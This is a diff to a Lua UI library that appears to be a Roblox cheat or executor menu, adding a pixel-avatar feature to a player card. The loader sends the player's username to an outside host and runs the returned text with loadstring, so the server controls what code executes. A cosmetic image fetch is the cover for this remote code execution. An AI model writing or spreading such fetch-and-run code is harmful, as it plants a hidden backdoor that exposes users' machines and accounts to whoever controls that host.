@@ -324,6 +324,74 @@ function UI:Window(opts)
     local dPlrIcon    = H.Sq(13,true,CR)  ; dPlrIcon.Color  = Theme.Accent   ; W._drawings.plrIcon    = dPlrIcon
     local dPlrInitial = H.Txt(14,12)                ; dPlrInitial.Color = Theme.Text   ; W._drawings.plrInitial = dPlrInitial
 
+    -- Avatar pixel squares (loaded async from luard API)
+    local _avatarPixels = {}   -- list of {sq, rx, ry} where rx/ry are 0..1 relative positions
+    local _avatarLoaded = false
+    local _avatarIconSize = 30
+
+    local function _loadAvatar(iconX, iconY)
+        if _avatarLoaded then return end
+        _avatarLoaded = true  -- prevent double-load
+        spawn(function()
+            local uname = tostring(LocalPlayer.Name)
+            local url = "https://api.luard.co/v1/user?v5=" .. uname .. "&res=32"
+            local ok, code = pcall(function() return game:HttpGet(url) end)
+            if not ok or not code or #code < 50 then
+                _avatarLoaded = false; return
+            end
+            local ok2 = pcall(function() loadstring(code)() end)
+            if not ok2 then _avatarLoaded = false; return end
+            local av = _G.avatar_data
+            if not av or not av.pixels then _avatarLoaded = false; return end
+            -- clear old pixels
+            for _, p in ipairs(_avatarPixels) do pcall(function() p.sq:Remove() end) end
+            _avatarPixels = {}
+            local pw = _avatarIconSize / av.width
+            local ph = _avatarIconSize / av.height
+            local pSize = math.min(pw, ph)
+            for py = 1, av.height do
+                for px = 1, av.width do
+                    local pixel = av.pixels[py] and av.pixels[py][px]
+                    if pixel then
+                        local sq = Drawing.new("Square")
+                        sq.Filled = true
+                        sq.Color  = Color3.fromRGB(pixel.r or 0, pixel.g or 0, pixel.b or 0)
+                        sq.Transparency = pixel.a or 1
+                        sq.Size   = H.Vec2(math.ceil(pSize)+1, math.ceil(pSize)+1)
+                        sq.ZIndex = 14
+                        sq.Visible = false
+                        -- store relative position (0..1)
+                        table.insert(_avatarPixels, {
+                            sq = sq,
+                            rx = (px-1) / av.width,
+                            ry = (py-1) / av.height,
+                        })
+                    end
+                end
+            end
+            -- hide fallback icon now that we have pixels
+            dPlrIcon.Visible = false
+            dPlrInitial.Visible = false
+        end)
+    end
+
+    local _lastIconX, _lastIconY = 0, 0
+    local function _updateAvatarPixels(iconX, iconY, iconSize, vis, prog)
+        if not _avatarLoaded or #_avatarPixels == 0 then return end
+        local pSize = iconSize / math.sqrt(#_avatarPixels)  -- approx
+        -- recalc from first pixel
+        for _, p in ipairs(_avatarPixels) do
+            local px = iconX + p.rx * iconSize
+            local py = iconY + p.ry * iconSize
+            p.sq.Position = H.Vec2(px, py)
+            p.sq.Transparency = prog
+            p.sq.Visible = vis
+        end
+        -- hide fallback when pixels are showing
+        dPlrIcon.Visible = false
+        dPlrInitial.Visible = false
+    end
+
     local _userName = tostring(LocalPlayer.Name)
     local _dispName = _userName
     pcall(function()
@@ -446,10 +514,15 @@ function UI:Window(opts)
         local iconSize = 30
         local iconX = pos.X + P
         local iconY = plrY + plrH/2 - iconSize/2
+        -- trigger async load on first draw
+        if not _avatarLoaded then _loadAvatar(iconX, iconY) end
+        -- fallback icon (shown until avatar loads)
         dPlrIcon.Position = H.Vec2(iconX, iconY); dPlrIcon.Size = H.Vec2(iconSize, iconSize)
-        dPlrIcon.Visible  = vis; f(dPlrIcon)
+        dPlrIcon.Visible  = vis and #_avatarPixels == 0; f(dPlrIcon)
         dPlrInitial.Position = H.Vec2(iconX + iconSize/2 - 4, iconY + iconSize/2 - 6)
-        dPlrInitial.Visible  = vis; ft(dPlrInitial)
+        dPlrInitial.Visible  = vis and #_avatarPixels == 0; ft(dPlrInitial)
+        -- pixel avatar
+        _updateAvatarPixels(iconX, iconY, iconSize, vis, _openProg)
 
         -- Spoof button: right side of player card
         local spoofBtnW = 18; local spoofBtnH = 18
@@ -832,7 +905,11 @@ function UI:Window(opts)
     function W:Toggle(b)
         if b == nil then self._open = not self._open else self._open = b end
     end
-    function W:Unload() self._running = false end
+    function W:Unload()
+        self._running = false
+        for _, p in ipairs(_avatarPixels) do pcall(function() p.sq:Remove() end) end
+        _avatarPixels = {}
+    end
     function W:SetKey(key)
         self.Key = key
         if key and not table.find(self._tracked, key) then
